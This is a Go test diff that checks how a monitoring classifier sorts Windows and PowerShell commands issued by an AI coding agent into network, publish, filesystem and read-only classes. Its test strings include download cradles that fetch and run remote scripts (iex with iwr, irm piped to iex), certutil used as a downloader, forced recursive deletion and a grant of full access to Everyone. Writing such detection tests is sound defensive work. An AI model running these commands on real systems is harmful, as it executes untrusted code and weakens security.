@@ -125,3 +125,65 @@ func TestIsNetworkClass(t *testing.T) {
 		}
 	}
 }
+
+// Windows endpoints run PowerShell and cmd.exe. The collector hands both to Bash,
+// since Claude Code's PowerShell tool carries its script in tool_input.command like
+// the Bash tool does.
+func TestBashWindowsAndPowerShell(t *testing.T) {
+	cases := []struct {
+		command   string
+		wantArgv0 string
+		wantClass string
+		why       string
+	}{
+		// Network.
+		{"curl.exe https://example.com", "curl", ClassNetwork, "exe suffix does not hide the tool"},
+		{`& "C:\Windows\System32\curl.exe" https://x.test`, "curl", ClassNetwork, "call operator and quoted absolute path"},
+		{"ssh.exe build-host", "ssh", ClassNetwork, "ssh.exe"},
+		{"Invoke-WebRequest -Uri https://x.test -OutFile a.zip", "invoke-webrequest", ClassNetwork, "cmdlet"},
+		{"iwr https://x.test/a.ps1", "iwr", ClassNetwork, "alias"},
+		{"iex (iwr https://x.test/a.ps1)", "iex", ClassNetwork, "download cradle: the cmdlet is not in command position"},
+		{"(New-Object Net.WebClient).DownloadString('http://x.test')", "new-object", ClassNetwork, ".NET web client"},
+		{`powershell -NoProfile -Command "irm http://x.test | iex"`, "powershell", ClassNetwork, "alias inside a quoted -Command string"},
+		{"Start-BitsTransfer -Source http://x.test/a -Destination a", "start-bitstransfer", ClassNetwork, "bits"},
+		{"certutil -urlcache -f http://x.test/a.exe a.exe", "certutil", ClassNetwork, "certutil as a downloader"},
+		{"Install-Module Pester", "install-module", ClassNetwork, "gallery install"},
+		{"winget install Git.Git", "winget", ClassNetwork, "winget install"},
+		{"choco install nodejs", "choco", ClassNetwork, "chocolatey install"},
+		{"dotnet restore", "dotnet", ClassNetwork, "nuget restore"},
+		{"Test-NetConnection x.test -Port 443", "test-netconnection", ClassNetwork, "port probe"},
+
+		// Publish and vcs_write still outrank network.
+		{"git.exe push origin main", "git", ClassVCSWrite, "git.exe push"},
+		{"Publish-Module -Name Foo -NuGetApiKey $k", "publish-module", ClassPublish, "powershell gallery publish"},
+		{"nuget push a.nupkg -Source https://x.test", "nuget", ClassPublish, "nuget push"},
+		{"dotnet nuget push a.nupkg", "dotnet", ClassPublish, "dotnet nuget push"},
+
+		// Filesystem.
+		{"Remove-Item -Recurse -Force build", "remove-item", ClassFilesystem, "delete"},
+		{"del /q build", "del", ClassFilesystem, "cmd delete"},
+		{"Set-Content -Path a.txt -Value x", "set-content", ClassFilesystem, "write"},
+		{"robocopy src dst /mir", "robocopy", ClassFilesystem, "mirror"},
+		{"icacls C:\\data /grant Everyone:F", "icacls", ClassFilesystem, "permission change"},
+		{"Get-Content a.txt > b.txt", "get-content", ClassFilesystem, "redirect turns a read into a write"},
+
+		// Read-only.
+		{"dir", "dir", ClassReadOnly, "cmd listing"},
+		{"Get-ChildItem -Recurse | Select-String TODO", "get-childitem", ClassReadOnly, "pipeline of read-only cmdlets"},
+		{"Get-Process", "get-process", ClassReadOnly, "inspection"},
+
+		// Not network, and must not be mistaken for it.
+		{"dotnet build", "dotnet", ClassOther, "build is local; restore is the network part"},
+		{"certutil -hashfile a.txt SHA256", "certutil", ClassOther, "hashing is local"},
+		{"echo irmin", "echo", ClassReadOnly, "irm inside another word is not the alias"},
+	}
+	for _, c := range cases {
+		argv0, class := Bash(c.command)
+		if argv0 != c.wantArgv0 {
+			t.Errorf("Bash(%q) argv0 = %q, want %q", c.command, argv0, c.wantArgv0)
+		}
+		if class != c.wantClass {
+			t.Errorf("Bash(%q) class = %q, want %q (%s)", c.command, class, c.wantClass, c.why)
+		}
+	}
+}
